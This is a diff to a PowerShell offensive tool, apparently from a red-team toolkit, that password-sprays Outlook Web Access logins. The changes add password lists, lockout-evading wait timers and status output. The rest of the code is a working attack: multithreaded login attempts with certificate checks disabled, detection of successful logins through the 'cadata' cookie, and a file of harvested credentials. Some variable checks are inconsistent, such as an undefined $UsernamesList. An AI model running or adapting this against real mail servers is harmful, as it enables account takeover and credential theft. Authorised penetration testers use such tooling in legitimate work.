@@ -1582,7 +1582,7 @@ function Invoke-PasswordSprayOWA{
 
     .PARAMETER Password
 
-        A single password to attempt a password spray with.
+        A single password to attempt a password spray with or a list of usernames 1 per line to to attempt to password spray against..
 
     .PARAMETER Threads
        
@@ -1591,6 +1591,18 @@ function Invoke-PasswordSprayOWA{
     .PARAMETER Domain
 
         Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
+    
+    .PARAMETER Waittime
+
+        Specify an amount of time to wait before starting the next password spray.
+    
+    .PARAMETER FailedAttempts
+
+        Specify an amount of Attempts to try before waiting. This must be used with waittime.
+    
+    .PARAMETER Status
+
+        Display the current user is attempting to password spray.
 
   
   .EXAMPLE
@@ -1602,155 +1614,211 @@ function Invoke-PasswordSprayOWA{
     This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to password spray a list of usernames with a single password over 15 threads and write to a file called owa-sprayed-creds.txt.
 
 #>
-  Param(
+Param(
+    [Parameter(Position = 0, Mandatory = $false)][system.URI]$ExchHostname = "",
+    [Parameter(Position = 1, Mandatory = $False)][string]$OutFile = "",
+    [Parameter(Position = 2, Mandatory = $False)][string]$UserList = "",
+    [Parameter(Position = 3, Mandatory = $False)][string]$Password = "",
+    [Parameter(Position = 4, Mandatory = $False)][string]$Threads = "5",
+    [Parameter(Position = 6, Mandatory = $False)][string]$Domain = "",
+    [Parameter(Position = 7, Mandatory = $False)][int]$Waittime = "",
+    [Parameter(Position = 8, Mandatory = $False)][int]$FailedAttempts = "",
+    [Parameter(Position = 9, Mandatory = $False)][ValidateSet("Y","N")][String]$Status = "Y"
+) 
 
-
-    [Parameter(Position = 0, Mandatory = $false)]
-    [system.URI]
-    $ExchHostname = "",
-
-    [Parameter(Position = 1, Mandatory = $False)]
-    [string]
-    $OutFile = "",
-
-    [Parameter(Position = 2, Mandatory = $False)]
-    [string]
-    $UserList = "",
-
-    [Parameter(Position = 3, Mandatory = $False)]
-    [string]
-    $Password = "",
-
-    [Parameter(Position = 4, Mandatory = $False)]
-    [string]
-    $Threads = "5",
-
-    [Parameter(Position = 6, Mandatory = $False)]
-    [string]
-    $Domain = ""
-
-  )
-    
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
     $currenttime = Get-Date
     Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
     #Setting up URL's for later
     $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
     $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
-     
+  
+    if ($UsernamesList -eq "")
+        {
+            Write-Error "Invalid number of arguments given. Require -UsernamesList"
+        }
+    elseif ($Password -eq "")
+        {
+            Write-Error "Invalid number of arguments given. Require -Password"
+        }
+
+    if(Test-Path $Password)
+        {
+            $PwdList = Get-Content $Password
+        }
+    else
+        {
+            $PwdList = $Password
+        }  
+
     $Usernames = Get-Content $UserList
     $count = $Usernames.count
+    $PasswordCount = $Passwords.Count
     $sprayed = @()
     $userlists = @{}
     $count = 0 
-    $Usernames |% {$userlists[$count % $Threads] += @($_);$count++}
+    $FailedCount = 0
+ 
+    # Populate the Email/Password Lists
+    $Usernames | ForEach-Object {$userlists[$count % $Threads] += @($_);$count++}
+  
+  # Does a depth first loop over usernames first, trying every password for each username sequentially in the list
 
-    0..($Threads-1) |% {
-
-    Start-Job -ScriptBlock{
-
-    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
-    ## Code From http://poshcode.org/624
-
-    ## Create a compilation environment
-    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
-    $Compiler=$Provider.CreateCompiler()
-    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
-    $Params.GenerateExecutable=$False
-    $Params.GenerateInMemory=$True
-    $Params.IncludeDebugInformation=$False
-    $Params.ReferencedAssemblies.Add("System.DLL") > $null
-
-    $TASource=@'
-    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
-      public class TrustAll : System.Net.ICertificatePolicy {
-        public TrustAll() { 
-        }
-        public bool CheckValidationResult(System.Net.ServicePoint sp,
-          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
-          System.Net.WebRequest req, int problem) {
-          return true;
-        }
-      }
-    }
-'@ 
-    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
-    $TAAssembly=$TAResults.CompiledAssembly
-
-    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
-    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
-    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
-
-    $Password = $args[1]
-    $OWAURL2 = $args[2]
-    $OWAURL = $args[3]
-    $Domain = $args[4]
-
-    ## end code from http://poshcode.org/624
-    ForEach($Username in $args[0])
+    foreach ($Password in $PwdList) 
     {
-        #Logging into Outlook Web Access    
-        $ProgressPreference = 'silentlycontinue'
-	if ($Domain -ne "")
-    {
-        $Username = ("$Domain" + "\" + "$Username")
-    }
-
-    $cadatacookie = ""
-    $sess = ""
-	$owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
-	$form = $owa.Forms[0]
-	$form.fields.password=$Password
-	$form.fields.username=$Username
-        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
-        #Check cookie in response
-        $cookies = $sess.Cookies.GetCookies($OWAURL2)
-        foreach ($cookie in $cookies)
+        if($FailedAttempts -le ($FailedCount/$Threads))
         {
-            if ($cookie.Name -eq "cadata")
-                {
-                $cadatacookie = $cookie.Value
-                }
+            if($Waittime -ge 1)
+            {
+                $currenttime = Get-Date
+                write-Host "[*] Sleeping for $Waittime minutes - Current date and time: $currenttime"
+                Start-Sleep -Seconds ($Waittime*60)
+                $FailedCount = 0
+            }  
         }
-	if ($cadatacookie)
-	{
-		Write-Output "[*] SUCCESS! User:$username Password:$password"
-	}
-	$curr_user+=1 
 
-    }
-    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL, $Domain | Out-Null
+    write-Host -ForegroundColor Red "[*]Spraying password $Password"
 
+    0..($Threads - 1) | % {  
+        
+        # Loops through passwords in the list sequentially
+            Start-Job -ScriptBlock {
+                
+                ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
+                ## Code From http://poshcode.org/624
+
+                ## Create a compilation environment
+                $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
+                $Compiler=$Provider.CreateCompiler()
+                $Params=New-Object System.CodeDom.Compiler.CompilerParameters
+                $Params.GenerateExecutable=$False
+                $Params.GenerateInMemory=$True
+                $Params.IncludeDebugInformation=$False
+                $Params.ReferencedAssemblies.Add("System.DLL") > $null
+
+                $TASource=@'
+                namespace Local.ToolkitExtensions.Net.CertificatePolicy{
+                public class TrustAll : System.Net.ICertificatePolicy {
+                    public TrustAll() { 
+                    }
+                    public bool CheckValidationResult(System.Net.ServicePoint sp,
+                    System.Security.Cryptography.X509Certificates.X509Certificate cert, 
+                    System.Net.WebRequest req, int problem) {
+                        return true;
+                    }
+                    }
+                    }
+'@ 
+                $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
+                $TAAssembly=$TAResults.CompiledAssembly
+
+                ## We now create an instance of the TrustAll and attach it to the ServicePointManager
+                $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
+                [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
+
+                $Password = $args[1]
+                $OWAURL = $args[2]
+                $OWAURL2 = $args[3]
+                $Domain = $args[4]
+                                    
+                foreach ($Username in $args[0]) 
+                    {
+                        #Logging into Outlook Web Access    
+                        $ProgressPreference = 'silentlycontinue'
+                            if ($Domain -ne "")
+                                {
+                                    $Username = ("$Domain" + "\" + "$Username")
+                                }
+                                        
+                        $cadatacookie = ""
+                        $sess = ""
+                        $owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
+                        $form = $owa.Forms[0]
+                        $form.fields.password=$Password
+                        $form.fields.username=$Username
+                        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
+                            
+                        if ($Status -eq 'Y')
+                            {
+                                write-host "`t Current User:$username Current Password:$password"
+                            }
+
+                        #Check cookie in response
+                        $cookies = $sess.Cookies.GetCookies($OWAURL2)
+                            
+                        foreach ($cookie in $cookies)
+                            {
+                                if ($cookie.Name -eq "cadata")
+                                    {
+                                        $cadatacookie = $cookie.Value
+                                    }
+                            }
+                        Try
+                            {
+                                if ($cadatacookie)
+                                {
+                                    write-output "[*] SUCCESS! User:$Username Password:$password"
+                                }
+                            }
+                       Catch
+                        {
+                        }
+                    }
+    
+                    $curr_user+=1
+                    
+            } -ArgumentList $userlists[$_], $Password, $OWAURL, $OWAURL2, $Domain | Out-Null
+            
+            $FailedCount+=1
+      }
+    
+    $Complete = Get-Date
+    $MaxWaitAtEnd = 10000
+    $SleepTimer = 200
+    $FullResults = @()
+    While($(Get-Job -State Running).Count -gt 0)
+        {
+            $RunningJobs = ""
+            ForEach($Job in $(Get-Job -State Running))
+                {
+                    $RunningJobs += ", $($Job.name)"
+                }       
+
+            $RunningJobs = $RunningJobs.Substring(2)
+            Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+            if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
+                {
+                    Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
+                    Get-Job -State Running | Remove-Job -Force
+                }
+            else
+            {
+                Start-Sleep -Milliseconds $SleepTimer
+                ForEach($Job in Get-Job)
+                {
+                    $JobOutput = Receive-Job $Job
+                    if ($JobOutput)
+                    {
+                        Write-Host -ForegroundColor "green" $JobOutput
+                        $FullResults += $JobOutput                   
+                        if ($OutFile -ne "")
+                            {
+                                Write-Verbose "Writing results to $OutFile"
+                                $FullResults | Out-File -Encoding ascii -Append $OutFile
+                            } 
+                    }
+                }
+            }
+        }      
 }
-$Complete = Get-Date
-$MaxWaitAtEnd = 10000
-$SleepTimer = 200
-        $fullresults = @()
-While ($(Get-Job -State Running).count -gt 0){
-    $RunningJobs = ""
-    ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
-    $RunningJobs = $RunningJobs.Substring(2)
-    Write-Progress  -Activity "Password Spraying the OWA portal at https://$ExchHostname/owa/. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
-    If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
-    Start-Sleep -Milliseconds $SleepTimer
-    ForEach($Job in Get-Job){
-        $JobOutput = Receive-Job $Job
-        Write-Output $JobOutput
-        $fullresults += $JobOutput
-    }
 
+if ($OutFile -ne "")
+  {
+      $FoundedCreds = Get-Content $OutFile | Measure-Object
+      Write-Host ("[*] A total of " + $FoundedCreds.Count + " credentials were obtained.")
+      Write-Output "Results have been written to $OutFile."
+  }
 }
-
-    Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
-    if ($OutFile -ne "")
-       {
-            $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
-            $fullresults = $fullresults -replace " Password:", ":"
-            $fullresults | Out-File -Encoding ascii $OutFile
-            Write-Output "Results have been written to $OutFile."
-       }
-}
-
 
 function Invoke-PasswordSprayEWS{
 
